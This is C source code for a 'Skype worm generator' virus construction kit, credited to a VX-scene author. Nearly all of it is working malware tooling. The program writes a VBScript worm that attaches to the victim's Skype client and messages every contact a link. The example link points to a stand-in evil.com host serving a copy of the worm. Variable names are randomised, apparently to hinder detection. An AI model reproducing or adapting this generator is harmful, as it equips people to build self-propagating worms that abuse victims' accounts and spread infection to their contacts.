   /*********************************************************************
    * SkypeWormGenerator v0.2 by [WarGame/doomriderz]                   *
    * This VCK can generate worm spreading using skype IM               *
    * greetz to: izee, SlageHammer, sk0r, Nibble, free0n and everybody  *
    * in VX scene                                                       *
    * This console proggy makes me remember TurboC :) on my old i386    *
    * Music: "Anarchy in UK"                                            *
    * TODO: Next version will have a GUI and more functions :)          *
    *********************************************************************/

   #include <stdio.h>
   #include <stdlib.h>

   void GenerateWorm(char *name,char *author,char *url,char *out)
   {
       char rand_chars[] = {"KlouAsFNyrxZV"};
       char skype_obj[5];
       char user_obj[3];
       FILE *fd = NULL;

       srand(time(NULL));

       sprintf(skype_obj,"%c%c%c%c%c",rand_chars[rand()%13],rand_chars[rand()%13],rand_chars[rand()%13],
           rand_chars[rand()%13],rand_chars[rand()%13]);

       if((fd = fopen(out,"a+")) == NULL)
       {
           printf("I could not create the output file !\n");
           return;
       }

       fprintf(fd,"' generated by SkWG\n");
       fprintf(fd,"on error resume next\n");
       fprintf(fd,"set %s = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")\n",skype_obj);
       fprintf(fd,"%s.Client.Start()\n",skype_obj);
       fprintf(fd,"%s.Attach()\n",skype_obj);
       sprintf(user_obj,"%c%c%c",rand_chars[rand()%13],rand_chars[rand()%13],rand_chars[rand()%13]);
       fprintf(fd,"For Each %s In %s.Friends\n",user_obj,skype_obj);
       fprintf(fd,"%s.SendMessage %s.handle,\"%s\"\n",skype_obj,user_obj,url);
       fprintf(fd,"next\n");
       fprintf(fd,"msgbox \"%s by %s\",,\"%s is here\"\n",name,author,name);

       fclose(fd);
       printf("Written!\n");
       return;
   }

   int main(int argc,char *argv[])
   {
       char prompt_s[32];
       short prompt;
       char worm_url[256]; /* it should be big enough */
       char worm_name[30]; /* the name of the worm */
       char worm_author[30]; /* the name of the author */
       char out[256];

       printf("SkWG v0.2 - SkypeWormGenerator by [WarGame/doomriderz]\n");
       printf("Press CTRL-C or CTRL-Z or use 3 to exit\n");
       printf("Options:\n");
       printf("[1] - Generate a worm\n");
       printf("[2] - Info about this VCK\n");
       printf("[3] - Exit\n");

       for(;1;)
       {
           prompt = 0;

           while(prompt != 1 && prompt != 2 && prompt != 3)
           {
               printf(">");
               scanf("%s",prompt_s);
               prompt = atoi(prompt_s);
           }

           if(prompt == 1)
           {
               printf("Worm generation setup\n");
               printf("----------------------------------------------\n");
               printf("You need to insert the following infos:\n");
               printf("Worm name - the name of the worm\n");
               printf("Worm author - the name of the author of the beast\n");
               printf("Worm url&msg - the url&msg that the worm uses in IM messages (like: Check this! http://www.evil.com/copyoftheworm.vbs)\n");
               printf("Output - the file where to write the worm (it should be something.vbs)\n");
               printf("----------------------------------------------\n");
               printf("Worm name:");
               gets(worm_name);
               gets(worm_name);
               printf("Worm author:");
               gets(worm_author);
               printf("Output:");
               gets(out);
               printf("Worm url and msg:");
               gets(worm_url);
               GenerateWorm(worm_name,worm_author,worm_url,out);
           }

           else if(prompt == 2)
           {
               printf("SkWG v0.2 by [WarGame/doomriderz]\n");
               printf("This is a VCK that can be used to create simple worms\n");
               printf("spreading using Skype IM\n");
               printf("For suggestions or bug notifications: wargame89@yahoo.it\n");
               printf("On Web: http://doomriderz.co.nr or my home: http://ihateyou.altervista.org\n");
               printf("Press any key to continue\n");
               getch();
           }

           else
           {
               exit(0);
           }
       }
   }
